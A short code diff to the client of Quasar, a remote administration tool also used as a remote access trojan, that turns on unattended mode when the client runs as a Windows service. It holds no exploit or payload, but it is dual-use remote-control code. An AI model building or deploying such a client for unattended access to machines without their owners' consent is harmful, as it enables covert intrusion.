@@ -2,6 +2,7 @@
 using Quasar.Client.Logging;
 using Quasar.Client.Messages;
 using Quasar.Client.Networking;
+using Quasar.Client.Services;
 using Quasar.Client.Setup;
 using Quasar.Client.User;
 using Quasar.Client.Utilities;
@@ -105,6 +106,9 @@ namespace Quasar.Client
             // decrypt and verify the settings
             if (!Settings.Initialize())
                 Environment.Exit(1);
+
+            if (RuntimeEnvironment.IsService)
+                Settings.UNATTENDEDMODE = true;
 
             ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
 
